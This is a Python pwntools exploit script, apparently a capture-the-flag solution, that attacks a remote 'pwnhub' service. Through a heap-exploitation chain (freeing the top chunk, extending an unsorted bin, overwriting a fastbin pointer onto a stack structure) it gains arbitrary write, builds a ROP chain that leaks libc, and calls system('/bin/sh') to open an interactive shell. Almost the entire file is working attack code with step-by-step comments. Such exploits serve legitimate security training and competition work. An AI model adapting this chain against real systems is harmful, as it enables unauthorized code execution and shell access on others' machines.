from pwn import *

g_local=0
context(log_level='debug', arch='amd64')
# e = ELF("./lib/libc.so.6")
if g_local:
	sh = process("./lib/ld.so --preload libdl.so.2 ./pwnhub".split(),
		env={"LD_LIBRARY_PATH":"./lib/"})
	# sh = process("./pwnhub")
	gdb.attach(sh, "b *0x4015e3")
else:
	sh = remote("pwnhub-01.hfsc.tf", 1337)

sh.recvuntil(b"> ")

def alloc(size):
	sh.send(b'3')
	sh.sendafter(b"size: ", str(size).encode())
	sh.recvuntil(b"> ")

def leak():
	sh.send(b'2')
	sh.recvuntil(b"leak: ")
	ret = u64(sh.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
	sh.recvuntil(b"> ")
	return ret

def read(data):
	sh.send(b'1'.ljust(16, b'\x00'))
	sh.send(data)
	sh.recvuntil(b"> ")

def allocs(size, times):
	one = b'3'.ljust(0x10, b'\x00') + str(size).encode().ljust(0x10, b'\x00')
	sh.send(one * times)
	for i in range(times):
		sh.recvuntil(b"size: ")
		sh.recvuntil(b"> ")

stk_addr = leak()

def make_free_chunk(count, last_alloc):
	allocs(0x80, count)
	last_alloc()
	alloc(0xffffffff)

	read(b'A' * 0x18 + p64(0xa1))

	alloc(0x80)

# The idea is to use first part of house of orange to put a top chunk into bins.
# However, it will be putted into tcache bins, so we do it for 9 times to put it to unsorted bin.
# This is because `malloc_consolidate` is called when top chunk is not enough for allocation.
make_free_chunk(22, lambda : alloc(0x40))
for i in range(8):
	make_free_chunk(25, lambda : (alloc(0x40), alloc(0x40)))

heap2_addr = leak()
read(p64(0x43090) + p64(0x10) + p64(0) + p64(0x11)) # fake chunks after extended unsorted bin

# now we have a 0x80 unsorted bin

for i in range(7):
	alloc(0x70) # Consume 0x80 tcache

alloc(0xffffffff)
read(b'A' * 0x18 + p64(0x43091))
# Extend the unsorted bin to 0x43091

allocs(0x80, 0x3c6)
alloc(0x60)
# Consume such unsorted bin to reach the 0x80 chunk in fastbin

alloc(0x80)
read(p64(0) + p64(0x81) + p64(stk_addr-0x10-9) + b'B' * 0x10)
# Overwrite fd of such 0x80 fastbin so that next chunk becomes the struct on stack.
alloc(0x80) # This can make sure linked list ends with NULL
# Current 0x80 fastbin is "0x1b93f60 -> 0x7ffc881ebfd0 -> 0x1b93ff0(0x80 allocated above) <- 0x0"

alloc(0x70)
# Allocate the fastbin chunk, so other chunks in 0x80 fastbin will be putted into tcache bin

alloc(0x70)
alloc(0x70)
# Allocate the struct from 0x80 tcache, now we can do arbitrary write,
# because now struct.ptr == &struct.ptr

ret_addr = stk_addr - 9 + 0x118
read(p64(ret_addr) + p64(0x100))

pop_rdi = p64(0x4015e3)
rop = pop_rdi + p64(0x405018) # rdi = address of got entry of puts
rop += p64(0x401368) # leak
rop += pop_rdi + p64(ret_addr + len(rop) + 3 * 8) # rdi = fake struct below
rop += p64(0x401336) # read
rop += p64(ret_addr + len(rop)) + p64(0x100)
# fake struct for read ROP function, its ptr points to itself
read(rop)

print(hex(stk_addr))
print(hex(heap2_addr))

sh.send(b'4')
sh.recvuntil(b"leak: ")
libc_addr = u64(sh.recvuntil(b'\n')[:-1].ljust(8, b'\x00')) - 0x783a0
# get leaked libc addr

rop2 = pop_rdi + p64(libc_addr + 0x18e1b0) # rdi = "/bin/sh"
rop2 += p64(libc_addr + 0x49970) # system
rop2 += p64(0)
sh.send(rop2)
# fill remaining ROP chain with libc addr

sh.interactive()
